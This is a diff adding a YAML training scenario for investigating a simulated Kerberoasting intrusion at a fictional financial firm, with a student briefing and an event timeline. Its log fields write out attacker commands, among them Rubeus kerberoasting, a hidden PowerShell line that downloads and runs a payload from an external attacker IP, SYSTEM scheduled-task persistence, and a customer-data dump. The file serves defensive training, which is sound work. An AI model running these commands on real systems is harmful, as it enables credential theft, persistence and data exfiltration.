@@ -1,0 +1,866 @@
+scenario_id: gen-windows-ad-kerberoasting-1337
+title: "Kerberoasting Attack with Compromised Service Account"
+description: >
+  An external attacker gains initial access to Meridian Financial's
+  network through a compromised VPN account belonging to a contractor.
+  After establishing a foothold on a developer workstation, the attacker
+  performs reconnaissance to enumerate domain service principal names
+  (SPNs), requests Kerberos TGS tickets for multiple service accounts,
+  and cracks them offline. The attacker successfully recovers the
+  password for the SQL service account (svc-sql), which has local admin
+  rights on several database servers. Using these credentials, the
+  attacker authenticates to a production SQL server, establishes
+  persistence via a scheduled task, attempts to access sensitive customer
+  financial data, and clears the Security event log to cover their
+  tracks. The investigation requires correlating Windows authentication
+  events (Kerberos ticket requests with RC4 encryption), process
+  telemetry showing reconnaissance tools (PowerView, Rubeus), lateral
+  movement via valid credentials, and a deliberate log-clearing event
+  that creates a forensic gap on the target server.
+student_briefing: >
+  Meridian Financial's Security Operations Center flagged unusual
+  Kerberos activity originating from DEV-WS-07, a developer workstation
+  in the Application Development department. The alert indicated multiple
+  TGS-REQ events for service accounts within a short time window,
+  followed several hours later by an anomalous interactive logon to the
+  production database server SQL-PROD-03 by a service account that
+  normally only performs non-interactive authentication. The database
+  administrator reports that portions of the Security event log on
+  SQL-PROD-03 are missing for a critical two-hour period. You have been
+  provided Windows event logs from the domain controller (DC01), the
+  initial workstation (DEV-WS-07), and the database server (SQL-PROD-03),
+  as well as Palo Alto firewall logs for the incident window (2026-05-01,
+  09:00-18:00 UTC). Your task is to determine how the attacker initially
+  accessed DEV-WS-07, what reconnaissance and credential access techniques
+  they used, how they moved to the database server, what they did there,
+  and to assess the scope of potential data access despite the log gap.
+difficulty: advanced
+version: "1.0"
+seed: 1337
+
+organization:
+  name: Meridian Financial Services
+  domain: meridian.example
+  industry: Financial Services
+  timezone: UTC
+  gcp_project_id: null
+
+mitre_tactics:
+  - Initial Access
+  - Discovery
+  - Credential Access
+  - Lateral Movement
+  - Persistence
+  - Defense Evasion
+
+learning_objectives:
+  - Identify Kerberoasting attacks through TGS-REQ patterns and encryption downgrades
+  - Correlate domain reconnaissance activity with subsequent credential access
+  - Trace lateral movement using compromised service account credentials
+  - Recognize log-clearing events and work around forensic gaps
+  - Distinguish normal service account behavior from attacker abuse
+  - Reconstruct an attack timeline across multiple hosts despite incomplete evidence
+
+tags: [kerberoasting, active-directory, credential-access, service-accounts, log-clearing, lateral-movement]
+
+start_time: "2026-05-01T09:00:00Z"
+
+actors:
+  contractor:
+    username: mjohnson
+    email: mjohnson@meridian.example
+    display_name: Mike Johnson
+    department: Application Development
+    role_title: Contract Developer
+    employee_id: MER-C-8821
+    is_compromised: true
+    is_privileged: false
+  svc_sql:
+    username: svc-sql
+    email: svc-sql@meridian.example
+    display_name: SQL Server Service Account
+    department: IT Infrastructure
+    role_title: Service Account
+    employee_id: MER-SVC-0014
+    is_compromised: true
+    is_privileged: true
+  svc_backup:
+    username: svc-backup
+    email: svc-backup@meridian.example
+    display_name: Backup Service Account
+    department: IT Infrastructure
+    role_title: Service Account
+    employee_id: MER-SVC-0022
+    is_privileged: true
+  svc_web:
+    username: svc-web
+    email: svc-web@meridian.example
+    display_name: Web Application Pool Account
+    department: IT Infrastructure
+    role_title: Service Account
+    employee_id: MER-SVC-0031
+    is_privileged: false
+  attacker:
+    username: unknown
+    email: attacker@external.example
+    display_name: External Threat Actor
+    is_compromised: true
+
+hosts:
+  dev-ws:
+    hostname: DEV-WS-07
+    ip_address: 10.50.20.47
+    host_type: workstation
+    os: windows
+    os_version: "Windows 10 22H2"
+    mac_address: "00:50:56:A1:2B:3C"
+    domain_joined: true
+  dc:
+    hostname: DC01
+    ip_address: 10.50.10.10
+    host_type: domain_controller
+    os: windows
+    os_version: "Windows Server 2019"
+    mac_address: "00:50:56:A1:1A:1B"
+    domain_joined: true
+  sql-prod:
+    hostname: SQL-PROD-03
+    ip_address: 10.50.30.15
+    host_type: server
+    os: windows
+    os_version: "Windows Server 2022"
+    mac_address: "00:50:56:A1:3D:4E"
+    domain_joined: true
+  vpn-gw:
+    hostname: VPN-GATEWAY
+    ip_address: 10.50.1.1
+    host_type: server
+    os: linux
+    os_version: "Ubuntu 22.04"
+    mac_address: "00:50:56:A1:0F:10"
+    domain_joined: false
+
+timeline:
+  - id: vpn-compromise
+    at: "+0m"
+    event_type: account_login_success
+    log_sources: [linux]
+    severity: medium
+    actor: contractor
+    host: vpn-gw
+    description: >
+      External attacker authenticates to the VPN gateway using
+      compromised credentials for contractor account mjohnson. The login
+      originates from a suspicious IP address in a foreign country, but
+      the contractor occasionally works remotely from various locations,
+      so this does not immediately trigger an alert.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Initial Access
+    process:
+      pid: 12847
+      name: sshd
+      command_line: "sshd: mjohnson [priv]"
+    extra:
+      source_ip: "45.142.212.61"
+      source_country: "RO"
+
+  - id: vpn-established
+    at: "+2m"
+    event_type: network_connection_allowed
+    log_sources: [palo_alto]
+    severity: low
+    actor: contractor
+    host: dev-ws
+    description: >
+      VPN tunnel established from external IP to the internal network.
+      Firewall logs show the source IP 45.142.212.61 being NAT'd to the
+      internal VPN pool address 10.50.1.50.
+    network:
+      protocol: tcp
+      src_ip: 45.142.212.61
+      src_port: 51823
+      dst_ip: 10.50.1.1
+      dst_port: 1194
+      action: allow
+      app: openvpn
+      rule_name: ALLOW-VPN-INBOUND
+      bytes_sent: 8420
+      bytes_received: 12890
+
+  - id: rdp-to-workstation
+    at: "+8m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: low
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker uses RDP to connect from the VPN pool to DEV-WS-07 using
+      mjohnson's domain credentials. This is consistent with the
+      contractor's normal remote work pattern.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Initial Access
+    extra:
+      logon_type: 10
+      source_ip: "10.50.1.50"
+      source_workstation: "VPN-GATEWAY"
+
+  - id: powerview-download
+    at: "+25m"
+    event_type: malware_download
+    log_sources: [windows, palo_alto]
+    severity: medium
+    actor: contractor
+    host: dev-ws
+    description: >
+      PowerShell downloads PowerView.ps1, a popular Active Directory
+      reconnaissance module from the PowerSploit framework, to DEV-WS-07.
+      The file is retrieved from a public GitHub repository.
+    mitre:
+      technique_id: T1059.001
+      technique_name: "Command and Scripting Interpreter: PowerShell"
+      tactic: Execution
+    process:
+      pid: 3892
+      ppid: 2104
+      name: powershell.exe
+      command_line: 'powershell.exe -ExecutionPolicy Bypass -Command "IWR -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile C:\Users\mjohnson\Documents\PowerView.ps1"'
+      parent_name: explorer.exe
+      integrity_level: Medium
+    network:
+      protocol: tcp
+      src_ip: 10.50.20.47
+      src_port: 49812
+      dst_ip: 185.199.108.133
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 1840
+      bytes_received: 387210
+
+  - id: ad-recon-users
+    at: "+32m"
+    event_type: process_created
+    log_sources: [windows]
+    severity: medium
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker imports PowerView and begins domain reconnaissance,
+      enumerating all domain user accounts and their properties to
+      identify high-value targets and service accounts.
+    mitre:
+      technique_id: T1087.002
+      technique_name: "Account Discovery: Domain Account"
+      tactic: Discovery
+    process:
+      pid: 4120
+      ppid: 3892
+      name: powershell.exe
+      command_line: 'powershell.exe -ExecutionPolicy Bypass -Command "Import-Module C:\Users\mjohnson\Documents\PowerView.ps1; Get-DomainUser | Select-Object samaccountname,serviceprincipalname,memberof | Out-File C:\Users\mjohnson\Documents\users.txt"'
+      parent_name: powershell.exe
+      integrity_level: Medium
+
+  - id: ad-recon-spns
+    at: "+38m"
+    event_type: process_created
+    log_sources: [windows]
+    severity: high
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker uses PowerView's Get-DomainUser function with the -SPN
+      parameter to specifically enumerate all domain accounts with a
+      Service Principal Name set — the prerequisite for a Kerberoasting
+      attack. Three service accounts are discovered: svc-sql, svc-backup,
+      and svc-web.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    process:
+      pid: 4328
+      ppid: 3892
+      name: powershell.exe
+      command_line: 'powershell.exe -ExecutionPolicy Bypass -Command "Import-Module C:\Users\mjohnson\Documents\PowerView.ps1; Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname | Out-File C:\Users\mjohnson\Documents\spns.txt"'
+      parent_name: powershell.exe
+      integrity_level: Medium
+
+  - id: rubeus-download
+    at: "+55m"
+    event_type: malware_download
+    log_sources: [windows, palo_alto]
+    severity: high
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker downloads Rubeus.exe, a C# toolset for Kerberos abuse
+      including automated Kerberoasting, from a file-sharing service. The
+      binary is saved to the user's Documents folder.
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    process:
+      pid: 5012
+      ppid: 2104
+      name: powershell.exe
+      command_line: 'powershell.exe -Command "IWR -Uri https://transfer.sh/rubeus.exe -OutFile C:\Users\mjohnson\Documents\rubeus.exe"'
+      parent_name: explorer.exe
+      sha256: "f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5"
+      integrity_level: Medium
+    network:
+      protocol: tcp
+      src_ip: 10.50.20.47
+      src_port: 49918
+      dst_ip: 104.21.72.43
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 2140
+      bytes_received: 241850
+
+  - id: kerberoast-svc-sql
+    at: "+1h05m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker executes Rubeus to request a Kerberos TGS ticket for
+      svc-sql's SPN (MSSQLSvc/SQL-PROD-03.meridian.example:1433). The
+      domain controller logs show a TGS-REQ for this service using RC4
+      encryption (etype 0x17), which is weaker and faster to crack than
+      AES. The encrypted ticket portion is saved to disk for offline
+      cracking.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    process:
+      pid: 5224
+      ppid: 3892
+      name: rubeus.exe
+      command_line: 'rubeus.exe kerberoast /user:svc-sql /outfile:C:\Users\mjohnson\Documents\tickets.txt /nowrap'
+      parent_name: powershell.exe
+      sha256: "f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5"
+      integrity_level: Medium
+    extra:
+      spn_requested: "MSSQLSvc/SQL-PROD-03.meridian.example:1433"
+      encryption_type: "RC4-HMAC"
+
+  - id: dc-tgs-svc-sql
+    at: "+1h05m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dc
+    description: >
+      Domain controller DC01 issues a TGS ticket for svc-sql in response
+      to mjohnson's request from 10.50.20.47. Event ID 4769 shows the
+      ticket was issued with RC4 encryption (0x17) rather than the more
+      secure AES256 (0x12), a common indicator of Kerberoasting tools
+      that request downgraded encryption to speed up offline cracking.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    extra:
+      event_id: 4769
+      service_name: "MSSQLSvc/SQL-PROD-03.meridian.example:1433"
+      requesting_user: "mjohnson"
+      requesting_host: "DEV-WS-07"
+      ticket_encryption: "0x17"
+      source_ip: "10.50.20.47"
+
+  - id: kerberoast-svc-backup
+    at: "+1h07m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker requests a TGS ticket for svc-backup's SPN
+      (backupexec/BACKUP-SRV-01.meridian.example). Same Rubeus execution
+      pattern as the previous service account.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    process:
+      pid: 5224
+      ppid: 3892
+      name: rubeus.exe
+      command_line: 'rubeus.exe kerberoast /user:svc-backup /outfile:C:\Users\mjohnson\Documents\tickets.txt /nowrap'
+      parent_name: powershell.exe
+      sha256: "f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5"
+      integrity_level: Medium
+    extra:
+      spn_requested: "backupexec/BACKUP-SRV-01.meridian.example"
+      encryption_type: "RC4-HMAC"
+
+  - id: dc-tgs-svc-backup
+    at: "+1h07m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dc
+    description: >
+      Domain controller issues TGS ticket for svc-backup with RC4
+      encryption in response to mjohnson's request.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    extra:
+      event_id: 4769
+      service_name: "backupexec/BACKUP-SRV-01.meridian.example"
+      requesting_user: "mjohnson"
+      requesting_host: "DEV-WS-07"
+      ticket_encryption: "0x17"
+      source_ip: "10.50.20.47"
+
+  - id: kerberoast-svc-web
+    at: "+1h09m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker requests TGS ticket for svc-web's SPN
+      (HTTP/webapp.meridian.example). This completes the Kerberoasting
+      sweep of all three discovered service accounts.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    process:
+      pid: 5224
+      ppid: 3892
+      name: rubeus.exe
+      command_line: 'rubeus.exe kerberoast /user:svc-web /outfile:C:\Users\mjohnson\Documents\tickets.txt /nowrap'
+      parent_name: powershell.exe
+      sha256: "f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5"
+      integrity_level: Medium
+    extra:
+      spn_requested: "HTTP/webapp.meridian.example"
+      encryption_type: "RC4-HMAC"
+
+  - id: dc-tgs-svc-web
+    at: "+1h09m"
+    event_type: credential_harvested
+    log_sources: [windows]
+    severity: critical
+    actor: contractor
+    host: dc
+    description: >
+      Domain controller issues TGS ticket for svc-web with RC4 encryption
+      in response to mjohnson's request.
+    mitre:
+      technique_id: T1558.003
+      technique_name: "Kerberoasting"
+      tactic: Credential Access
+    extra:
+      event_id: 4769
+      service_name: "HTTP/webapp.meridian.example"
+      requesting_user: "mjohnson"
+      requesting_host: "DEV-WS-07"
+      ticket_encryption: "0x17"
+      source_ip: "10.50.20.47"
+
+  - id: ticket-exfil
+    at: "+1h15m"
+    event_type: data_exfiltration
+    log_sources: [palo_alto]
+    severity: high
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker uploads tickets.txt (containing the three captured TGS
+      tickets in hashcat format) to a personal cloud storage service for
+      offline cracking on external infrastructure.
+    mitre:
+      technique_id: T1041
+      technique_name: "Exfiltration Over C2 Channel"
+      tactic: Exfiltration
+    network:
+      protocol: tcp
+      src_ip: 10.50.20.47
+      src_port: 50124
+      dst_ip: 142.250.185.14
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 18472
+      bytes_received: 3210
+
+  - id: rdp-disconnect
+    at: "+1h22m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: low
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker disconnects the RDP session from DEV-WS-07, leaving the
+      session in a disconnected state but not fully logging off. This
+      allows them to reconnect later without re-authenticating.
+    extra:
+      logon_type: 10
+      session_action: "disconnect"
+      source_ip: "10.50.1.50"
+
+  - id: vpn-disconnect
+    at: "+1h25m"
+    event_type: network_connection_allowed
+    log_sources: [palo_alto]
+    severity: low
+    actor: contractor
+    description: >
+      VPN tunnel from 45.142.212.61 closes. The attacker goes offline to
+      crack the harvested tickets on their own infrastructure.
+    network:
+      protocol: tcp
+      src_ip: 45.142.212.61
+      src_port: 51823
+      dst_ip: 10.50.1.1
+      dst_port: 1194
+      action: allow
+      app: openvpn
+      rule_name: ALLOW-VPN-INBOUND
+      bytes_sent: 125840
+      bytes_received: 89320
+
+  - id: vpn-reconnect
+    at: "+6h10m"
+    event_type: account_login_success
+    log_sources: [linux]
+    severity: medium
+    actor: contractor
+    host: vpn-gw
+    description: >
+      Attacker reconnects to the VPN from the same external IP
+      approximately 4 hours and 45 minutes after disconnecting —
+      consistent with the time needed to crack a weak service account
+      password offline using GPU-accelerated tools like hashcat.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Initial Access
+    process:
+      pid: 18923
+      name: sshd
+      command_line: "sshd: mjohnson [priv]"
+    extra:
+      source_ip: "45.142.212.61"
+      source_country: "RO"
+
+  - id: vpn-reconnect-fw
+    at: "+6h12m"
+    event_type: network_connection_allowed
+    log_sources: [palo_alto]
+    severity: low
+    actor: contractor
+    description: >
+      VPN tunnel re-established from external IP.
+    network:
+      protocol: tcp
+      src_ip: 45.142.212.61
+      src_port: 52901
+      dst_ip: 10.50.1.1
+      dst_port: 1194
+      action: allow
+      app: openvpn
+      rule_name: ALLOW-VPN-INBOUND
+      bytes_sent: 9120
+      bytes_received: 13450
+
+  - id: rdp-reconnect
+    at: "+6h18m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: low
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker reconnects to the existing RDP session on DEV-WS-07.
+    extra:
+      logon_type: 10
+      session_action: "reconnect"
+      source_ip: "10.50.1.50"
+
+  - id: test-svc-sql-creds
+    at: "+6h25m"
+    event_type: process_created
+    log_sources: [windows]
+    severity: medium
+    actor: contractor
+    host: dev-ws
+    description: >
+      Attacker uses PowerShell with the cracked svc-sql password to test
+      the credentials by creating a PSCredential object and attempting a
+      simple remote query against the domain controller. This validates
+      that the cracked password is correct.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Lateral Movement
+    process:
+      pid: 6128
+      ppid: 3892
+      name: powershell.exe
+      command_line: 'powershell.exe -Command "$pass = ConvertTo-SecureString ''SQLSvc2023!'' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential(''meridian\svc-sql'', $pass); Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {hostname}"'
+      parent_name: powershell.exe
+      integrity_level: Medium
+
+  - id: dc-auth-svc-sql-test
+    at: "+6h25m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: medium
+    actor: svc_sql
+    host: dc
+    description: >
+      Domain controller logs successful network logon for svc-sql
+      originating from DEV-WS-07 — the first time this service account
+      has authenticated from this workstation. This confirms the cracked
+      password is valid.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Lateral Movement
+    extra:
+      logon_type: 3
+      source_ip: "10.50.20.47"
+      source_workstation: "DEV-WS-07"
+
+  - id: smb-to-sql-prod
+    at: "+6h35m"
+    event_type: network_connection_allowed
+    log_sources: [palo_alto]
+    severity: medium
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      SMB traffic from DEV-WS-07 to SQL-PROD-03 over port 445, consistent
+      with remote authentication or file share access in preparation for
+      lateral movement.
+    network:
+      protocol: tcp
+      src_ip: 10.50.20.47
+      src_port: 50812
+      dst_ip: 10.50.30.15
+      dst_port: 445
+      action: allow
+      app: ms-ds-smbv3
+      rule_name: ALLOW-INTERNAL-SMB
+      bytes_sent: 4820
+      bytes_received: 9140
+
+  - id: wmi-lateral-movement
+    at: "+6h38m"
+    event_type: lateral_movement
+    log_sources: [windows]
+    severity: high
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Attacker uses WMI to execute a remote PowerShell command on
+      SQL-PROD-03 using the compromised svc-sql credentials. The svc-sql
+      account has local administrator rights on this server due to its
+      role running SQL Server services, allowing remote code execution.
+      The command downloads a second-stage payload to establish
+      persistence.
+    mitre:
+      technique_id: T1047
+      technique_name: "Windows Management Instrumentation"
+      tactic: Lateral Movement
+    process:
+      pid: 2844
+      ppid: 1024
+      name: powershell.exe
+      command_line: 'powershell.exe -NoP -W Hidden -Command "IWR -Uri http://45.142.212.61:8080/stage2.ps1 -OutFile C:\ProgramData\update.ps1; C:\ProgramData\update.ps1"'
+      parent_name: WmiPrvSE.exe
+      integrity_level: System
+
+  - id: login-sql-prod
+    at: "+6h38m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: high
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Successful network logon for svc-sql on SQL-PROD-03 from DEV-WS-07.
+      This is anomalous because svc-sql is a service account that
+      normally only authenticates locally for SQL Server processes, not
+      interactively or remotely from workstations.
+    mitre:
+      technique_id: T1078.002
+      technique_name: "Valid Accounts: Domain Accounts"
+      tactic: Lateral Movement
+    extra:
+      logon_type: 3
+      source_ip: "10.50.20.47"
+      source_workstation: "DEV-WS-07"
+
+  - id: stage2-download
+    at: "+6h38m"
+    event_type: malware_download
+    log_sources: [palo_alto]
+    severity: high
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      SQL-PROD-03 downloads stage2.ps1 from the attacker's external
+      command and control server over HTTP (not HTTPS, making the payload
+      visible in network logs if deep packet inspection were enabled).
+    mitre:
+      technique_id: T1105
+      technique_name: "Ingress Tool Transfer"
+      tactic: Command and Control
+    network:
+      protocol: tcp
+      src_ip: 10.50.30.15
+      src_port: 51203
+      dst_ip: 45.142.212.61
+      dst_port: 8080
+      action: allow
+      app: web-browsing
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 1240
+      bytes_received: 24870
+
+  - id: persistence-sql-prod
+    at: "+6h42m"
+    event_type: scheduled_task_created
+    log_sources: [windows]
+    severity: high
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Attacker creates a scheduled task on SQL-PROD-03 to execute
+      update.ps1 every hour, ensuring persistent access even if the
+      initial session is terminated. The task runs under the SYSTEM
+      account.
+    mitre:
+      technique_id: T1053.005
+      technique_name: "Scheduled Task/Job: Scheduled Task"
+      tactic: Persistence
+    process:
+      pid: 3192
+      ppid: 2844
+      name: schtasks.exe
+      command_line: 'schtasks.exe /Create /SC HOURLY /TN "WindowsUpdateCheck" /TR "powershell.exe -W Hidden -File C:\ProgramData\update.ps1" /RU SYSTEM /RL HIGHEST'
+      parent_name: powershell.exe
+      integrity_level: System
+
+  - id: sql-query-customers
+    at: "+6h58m"
+    event_type: process_created
+    log_sources: [windows]
+    severity: critical
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Attacker uses sqlcmd to query the production customer database,
+      dumping a table containing customer account numbers, names, and
+      encrypted credit card tokens to a CSV file on disk. The svc-sql
+      account has db_owner role on this database.
+    mitre:
+      technique_id: T1005
+      technique_name: "Data from Local System"
+      tactic: Collection
+    process:
+      pid: 3548
+      ppid: 2844
+      name: sqlcmd.exe
+      command_line: 'sqlcmd.exe -S localhost -d CustomerDB -Q "SELECT TOP 10000 AccountNumber,CustomerName,CardToken FROM dbo.PaymentMethods" -o C:\ProgramData\export.csv -s ","'
+      parent_name: powershell.exe
+      integrity_level: System
+
+  - id: file-staging
+    at: "+7h05m"
+    event_type: file_created
+    log_sources: [windows]
+    severity: critical
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      The CSV export containing 10,000 customer payment records is
+      compressed into a ZIP archive for exfiltration.
+    mitre:
+      technique_id: T1074.001
+      technique_name: "Data Staged: Local Data Staging"
+      tactic: Collection
+    file:
+      path: 'C:\ProgramData\data.zip'
+      filename: data.zip
+      sha256: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+      size_bytes: 842350
+
+  - id: exfil-start
+    at: "+7h12m"
+    event_type: data_exfiltration
+    log_sources: [palo_alto]
+    severity: critical
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      SQL-PROD-03 uploads data.zip (842 KB) to the attacker's external C2
+      server over HTTPS. The transfer completes in under 10 seconds.
+    mitre:
+      technique_id: T1041
+      technique_name: "Exfiltration Over C2 Channel"
+      tactic: Exfiltration
+    network:
+      protocol: tcp
+      src_ip: 10.50.30.15
+      src_port: 51487
+      dst_ip: 45.142.212.61
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 842350
+      bytes_received: 2410
+
+  - id: file-delete-export
+    at: "+7h20m"
+    event_type: file_deleted
+    log_sources: [windows]
+    severity: medium
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Attacker deletes export.csv and data.zip from disk to remove
+      immediate forensic evidence of the data theft.
+    mitre:
+      technique_id: T1070.004
+      technique_name: "Indicator Removal: File Deletion"
+      tactic: Defense Evasion
+    file:
+      path: 'C:\ProgramData\export.csv'
+      filename: export.csv
+
+  - id: file-delete-zip
+    at: "+7h21m"
+    event_type: file_deleted
+    log_sources: [windows]
+    severity: medium
+    actor: svc_sql
+    host: sql-prod
+    description: >
+      Continuation of file deletion — the ZIP archive is removed.
